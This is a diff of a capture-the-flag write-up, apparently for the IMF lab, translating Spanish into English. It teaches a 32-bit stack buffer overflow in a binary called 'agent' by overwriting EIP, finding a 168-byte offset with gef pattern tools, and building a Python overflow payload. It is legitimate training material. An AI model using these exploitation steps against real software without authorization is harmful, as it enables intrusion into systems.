@@ -1897,8 +1897,7 @@ Enter selection: 3
 Enter report update:
 ```
 
-donde nos dejaba meter input verdad ? pues este input que nos dejaba meter se llama ESP que es la pila donde nos deja meter nuestro input 
-entonces como nosotros metimos tantas AAAAAAA's se vieron afectados el EBP y el EIP  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+and this also where it allowed us to input, right? Well, this input that it allowed us to input is called ESP, which is the stack where it allows us to input our input. So, as we entered so many AAAAAAA's, the EBP and EIP were affected
 
 
 ```bash 
@@ -1906,13 +1905,12 @@ entonces como nosotros metimos tantas AAAAAAA's se vieron afectados el EBP y el 
 +------------------------------------+---------------------+------+-----+
 | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|AAAAAAAAAAAAAAAAAAAAA|AAAAAAAAAAAA| 
 +------------------------------------+---------------------+------+-----+
-
 ```
-Pero como la aplicacion interpreta la A en hexadecimal entonces en lugar de que el EBP y el EIP valgan A valdria \x41, la pila si va a valer el input nuestro porque es un lugar al que si podriamos meter nuestro input el hecho de que nos deje escribir en el EIP hace que el programa se corrompa porque EIP es el instruccion Pointer o sea seria como el que manda para donde va el flujo del programa pensemos como que EIP seria el flautista de hamelín y este flautista diga para donde quiere mover esos ratones que con su musica estan encantados, pues aqui igual el EIP dice para donde ira el programa pero como nosotros agregamos A's entonces EIP no sabe para donde ir porque una A no es una direccion 
+But since the application interprets A as hexadecimal, instead of EBP and EIP being valued as A, they would be valued as \x41. The stack will still hold our input because it is a place where we can write our input. The fact that we can write into EIP corrupts the program because EIP is the instruction pointer, which is like the one that directs the flow of the program. Let's think of EIP as the pied piper of Hamelin who decides where to move the mice with his music. Similarly, EIP tells the program where to go, but since we added A's, EIP doesn't know where to go because A is not a valid address. 
 
 
 
-tomando el ejemplo anterior y para darle mas enfasis a lo que dijimos representado seria asi
+Taking the previous example, and to emphasize what we said, it would be represented as follows:
 
 ```bash 
         ESP                          |       EBP           | EIP
@@ -1920,14 +1918,12 @@ tomando el ejemplo anterior y para darle mas enfasis a lo que dijimos representa
 | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
 +------------------------------------+---------------------+------+-----+
 ```
-- pero quizas el hecho de que habimos dicho, que la A estaria representado en hexadecimal, seria asi \x41 y que tu veas en el ejemplo menos representaciones 
-de A o sea veas menos \x41, pues esto es solo un ejemplo si tu agregas 100 A's pues seran 100 representaciones de A o sea 100 \x41
+- But perhaps the fact that we said that the A would be represented in hexadecimal as \x41, and you see in the example fewer representations of A, that is, you see fewer \x41s. Well, this is just an example. If you add 100 A's, there will be 100 representations of A's, or 100 \x41s.
 
 
+So, as we mentioned before, the idea is that since we managed to input data into the EIP, we could manipulate the EIP. However, to do this, we need to measure how many characters we need to input to reach the EIP. To do this, we will use gdb gef, which is a low-level analysis tool. This means that it is a tool for analyzing machine code. We could also use peda or ghidra, but in my case, I will use gdb.
 
-Entonces como habiamos dicho la idea es que como logramos meter input al EIP podriamos manipular el EIP pero para esto tendremos que medir cuantos caracteres necesitamos meter para alcanzar el EIP para esto vamos a jugar con gdb gef que es una herramienta de analisis a bajo nivel esto quiere decir que es una herramienta para analisis de codigo maquina tambien podriamos usar peda o usar ghidra en mi caso usare gdb
-
-le damos a gdb + el binario + q
+we execute gdb + the binary + q
 
 ```bash 
 ❯ gdb agent -q
@@ -1938,13 +1934,13 @@ GEF for linux ready, type `gef' to start, `gef config' to configure
 Reading symbols from agent...
 (No debugging symbols found in agent)
 ```
-ahora debemos correr el programa 
+now we have to run the program using r 
 
 ```bash 
 gef➤  r
 ```
 
-output | el programa va a parecer que se corrio normalmente pero por detras esta gef analizando todo lo que se ejecuta por detras 
+output | The program will appear to have run normally, but behind the scenes, GEF is analyzing everything that is executed.
 
 ```bash 
 Starting program: /home/z3kk3n/Desktop/imf/agent 
@@ -1959,7 +1955,7 @@ Agent ID :
 
 ```
 
-vamos a usar los mismos pasos que usamos antes para corromper la aplicacion y que se aplique el segmentation fault 
+Let's use the same steps as before to corrupt the application and cause a segmentation fault
 
 
 ```bash 
@@ -2016,16 +2012,13 @@ $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  
 ```
-aqui tenemos la habilidad de analizar todo con mas detalles porque ya con solo ver esto vemos lo que sobre escribimos tanto el eip $eip   : 0x41414141 ("AAAA"?)  como el ebp $ebp   : 0x41414141 ("AAAA"?)
+Here we have the ability to analyze everything in more detail because just by looking at this, we can see what we overwrote, both the eip $eip : 0x41414141 ("AAAA"?) and the ebp $ebp : 0x41414141 ("AAAA"?).
 
+So, the idea is to measure in order to use the EIP as we want, right?
 
-entonces la idea es medir para poder usar el EIP a nuestro antojo verdad ?
+Well, we simply create a pattern using the same tool, which is called gef, to insert that pattern into the ESP or stack, and then count how many characters we need to add until we reach the EIP or instruction pointer.
 
-
-pues simplemente vamos a crear un patron con la misma herramienta que se llama gef para meter ese patron en el ESP o en la pila, para luego contar cuantos caracteres tenemos que agregar hasta que llegamos a alcanzar el EIP o el instruction pointer 
-
-
-para esto vamos jugar con un parametro que se llama create patten 
+For this, we will play with a parameter called "pattern create"
 
 ```bash 
 gef➤  pattern create
@@ -2034,10 +2027,9 @@ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
 
 ```
 
-ahora la idea es agregar este patron en el input del binario o sea en lugar de las  A's agregamos el patron esto para determinar los valores EIP y EBP 
-entonces ejecutamos el programa con gdb como cuando queriamos ver los valores con el gef
+Now the idea is to add this pattern to the binary input, instead of the A's we add the pattern in order to determine the values of EIP and EBP. Then we run the program with gdb as we did before to check the values using gef.
 
-entonces ```gdb agent -q``` luego ```r``` para correr el programa ```3``` para seleccionar el campo vulnerable ```input``` aqui metermos nuestro pattern create
+so first of all execute ```gdb agent -q``` after  ```r``` to run the program ```3``` to select the field that has the vulnerability ```input``` finally here we have to add our pattern create
 
 output
 ```bash 
@@ -2069,9 +2061,11 @@ $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
-como podemos ver ahora $eip vale 0x62616171 ("qaab"?) y el esp vale todo esto $esp   : 0xffffd3f0  →  "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"
+now as we can see the value of  ```$eip``` is ```0x62616171```, ```("qaab"?)``` 
 
-una representacion grafica seria 
+and the value of ``` esp``` is  : ```0xffffd3f0  →  "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"```
+
+A graphical representation would be 
 
 ```bash 
         ESP                          |       EBP           | EIP
@@ -2093,13 +2087,11 @@ gef➤  pattern offset $eip
 gef➤  
 
 ```
-entonces nos dice que tenemos que meter 168 caracteres para llegar a eip podriamos corroborarlo haciendo un oneline en python3 
+Then it tells us that we have to enter 168 characters to reach EIP, we could corroborate it by doing a one-liner in Python3.
 
-multiplicando valores como sabemos eip su valor es 4 porque en el gef nos salian 4 caracteres reecuerdas ? ("qaab"?) entonces le diremos 
+Multiplying values as we know EIP's value is 4 because in gef we saw 4 characters, do you remember? ("qaab"?)
 
-multiplicame 168 por que son las que necesitamos para alcanzar eip luego multiplicame 4 B para escribir en el EIP y luego muultipliquemos 100 c' porque siempre es 
-
-bueno saber donde se almacenan otros valores en este caso pondremos 100 c's 
+then we will tell it to multiply 168 because those are the ones we need to reach EIP, then multiply 4 B to write in the EIP and then let's multiply 100 c's because it's always good to know where other values are stored, in this case we will put 100 c's
 
 ```bash 
 ❯ python3 -c 'print ("A"*168 + "B"*4 + "C"*100)'
@@ -2110,7 +2102,7 @@ ahora la idea es correr el programa nuevamente o sea tendriamos que hacer un qui
 ```bash 
 gef➤  quit
 ```
-entonces ```gdb agent -q``` luego ```r``` para correr el programa ```3``` para seleccionar el campo vulnerable ```input``` aqui metermos nuestro pattern create
+so first of all execute ```gdb agent -q``` after  ```r``` to run the program ```3``` to select the field that has the vulnerability ```input``` finally here we have to add our pattern create
 
 output
 ```bash
